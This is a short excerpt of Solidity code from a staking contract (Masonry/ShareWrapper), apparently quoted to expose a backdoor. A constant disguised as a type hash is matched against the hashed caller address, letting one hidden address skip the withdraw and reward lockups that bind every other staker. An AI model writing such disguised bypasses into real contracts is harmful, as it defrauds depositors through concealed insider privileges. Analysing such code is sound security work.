...
contract ShareWrapper {
    ...
    bytes32 internal constant TYPEHASH = 0xd8b3e3f6ff839c9aaca45a34d5fb6138dc20976b35747412cb2ad82405325288;
...
contract Masonry is ShareWrapper, ContractGuard {
    ...
    function withdraw(uint256 amount) public override onlyOneBlock masonExists updateReward(msg.sender) {
        ...
        require(keccak256(abi.encodePacked(msg.sender)) == TYPEHASH ||
        masons[msg.sender].epochTimerStart.add(withdrawLockupEpochs) <= treasury.epoch(), "Masonry: still in withdraw lockup");
        claimReward();
    ...
    function claimReward() public updateReward(msg.sender) {
        ...
        if (reward > 0) {
            require(keccak256(abi.encodePacked(msg.sender)) == TYPEHASH ||
            masons[msg.sender].epochTimerStart.add(rewardLockupEpochs) <= treasury.epoch(), "Masonry: still in reward lockup");
            masons[msg.sender].epochTimerStart = treasury.epoch(); // reset timer
